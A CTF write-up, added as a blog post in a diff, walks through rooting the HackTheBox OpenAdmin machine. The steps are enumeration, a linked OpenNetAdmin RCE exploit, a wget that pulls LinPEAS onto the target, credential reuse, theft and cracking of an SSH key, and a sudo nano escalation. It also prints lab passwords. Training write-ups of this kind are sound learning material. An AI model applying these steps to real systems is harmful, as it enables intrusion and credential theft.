@@ -1,0 +1,135 @@
+---
+title: 'HackTheBox - [CTF] OpenAdmin'
+summary: "Writeup of the HackTheBox's OpenAdmin CTF."
+---
+
+![banner](/blog/hackthebox-ctf-openadmin/banner.png)
+
+Ready for a new machine? Let's start with open ports enumeration:
+
+![nmap](/blog/hackthebox-ctf-openadmin/nmap.png)
+
+As a result, we can see that there is a Apache webserver on port 80:
+
+![apache](/blog/hackthebox-ctf-openadmin/apache.png)
+
+Let's run **dirbuster** against the webserver to see if we can find some interesting directory:
+
+![dirbuster](/blog/hackthebox-ctf-openadmin/dirbuster.png)
+
+So we can see that there is a **/ona/** and **/ona/login.php** directories that seems interesting:
+
+![ona](/blog/hackthebox-ctf-openadmin/ona.png)
+
+![ona login webpage](/blog/hackthebox-ctf-openadmin/ona-login.png)
+
+**OpenNetAdmin** is a Network Management application working with a centralized AJAX web interface.
+So this application is installed on the webserver, and the version installed is not the latest one, it's the **version 18.1.1**.
+
+By searching a exploit for this version on google we can find a **Remote Code Execution** exploit really quickly here:
+https://www.exploit-db.com/exploits/47691.
+
+![exploit](/blog/hackthebox-ctf-openadmin/exploit.png)
+
+We can now execute some commands on the system, but it's very limited.
+We have to find a way to gain access to a not restricted shell.
+
+Let's use **LinPEAS**, it's a really useful script that searh for possible paths to escalate privileges on Linux,
+the script is available here: https://github.com/peass-ng/PEASS-ng.
+
+To download the script on the system we just have to execute this command:
+
+```shell
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+```
+
+And then, this command to execute it and store the results in a text file:
+
+```shell
+./linpeas.sh -a > linpeas_result.txt
+```
+
+After searching in the linpeas_result.txt file we can see that there is an interesting file who contain this line:
+**'db_passwd' => 'n1nj4W4rri0R!'**.
+
+![first password](/blog/hackthebox-ctf-openadmin/first-password.png)
+
+Let's open this file to see exactly what it contain: **/var/www/ona/local/config/database_settings.inc.php**.
+It seems that we find database credential for the **ona_sys** user.
+
+![db creds](/blog/hackthebox-ctf-openadmin/db-creds.png)
+
+But after trying to connect to mysql with 10.10.10.171 host, it seems like it's not possible to connect to mysql.
+So maybe this password is used for something else... Let's see the users on the system:
+
+![users](/blog/hackthebox-ctf-openadmin/user.png)
+
+Ok so there is two users on the system, we can try to use the password we find on the user jimmy:
+
+![jimmy](/blog/hackthebox-ctf-openadmin/jimmy.png)
+
+Bingo, we finally have a SSH shell with the user jimmy! But what we want is to have access to a shell with root privilege.
+
+Once again, let's use **LinPEAS** to see what we can find:
+
+![hash](/blog/hackthebox-ctf-openadmin/hash.png)
+
+It seems that LinPEAS found an interesting hash in the file **/var/www/internal/index.php**, let's open it:
+
+![hash 2](/blog/hackthebox-ctf-openadmin/hash2.png)
+
+This look like a connection page, the username and the **sha512** hash are hardcoded,
+and once the is established there is a redirection to the main.php page.
+
+![main](/blog/hackthebox-ctf-openadmin/main.png)
+
+The main.php page seems to execute a cat on the **/home/joanna/.ssh/id_rsa** file,
+so it give the private SSH key of the joanna user. Now the challenge is to access this connection page index.php.
+
+So now that we have a hash let's crack it, for this hash we can directly crack it on https://crackstation.net/:
+
+![crack hash](/blog/hackthebox-ctf-openadmin/crack-hash.png)
+
+Let's list all the open ports on the system:
+
+![netstat](/blog/hackthebox-ctf-openadmin/netstat.png)
+
+The port 52846 is open on localhost. We can do a curl on it to see what it is.
+
+![curl](/blog/hackthebox-ctf-openadmin/curl.png)
+
+This is the index.php connection page that we just found earlier in the internal directory.
+So we just have to do a curl on the main.php page to get the SSH key.
+
+![ssh key](/blog/hackthebox-ctf-openadmin/ssh-key.png)
+
+It's working, we now have the joanna's SSH privaye key. With this key we can have a SSH shell with user joanna.
+Let's transfer this key on our computer with **scp** command, and let's crack it with **john**.
+
+![ssh2john](/blog/hackthebox-ctf-openadmin/ssh2john.png)
+
+![john crack](/blog/hackthebox-ctf-openadmin/john-crack.png)
+
+John find that the passphrase of the key is: **bloodninjas**. So let's try to connect to ssh with user joanna using this key.
+First, we need to change the .ssh config file to match with this new key,
+and we have to change the SSH key file permission to **600**.
+
+![ssh config](/blog/hackthebox-ctf-openadmin/ssh-config.png)
+
+Then we can connect:
+
+![joanna](/blog/hackthebox-ctf-openadmin/joanna.png)
+
+Now we have to gain access to a shell with root privilege.
+Let's find which commands current user is allowed with sudo, using the **sudo -l** command:
+
+![sudo -l command result](/blog/hackthebox-ctf-openadmin/sudo-l.png)
+
+Joanna is allowed to run nano on the file **/opt/priv** with sudo and without password needed.
+Here we can find an exploit using nano and sudo: https://gtfobins.github.io/gtfobins/nano/.
+
+![nano exploit](/blog/hackthebox-ctf-openadmin/nano-exploit.png)
+
+Bingo! Machine rooted!
+
+![root](/blog/hackthebox-ctf-openadmin/root.png)
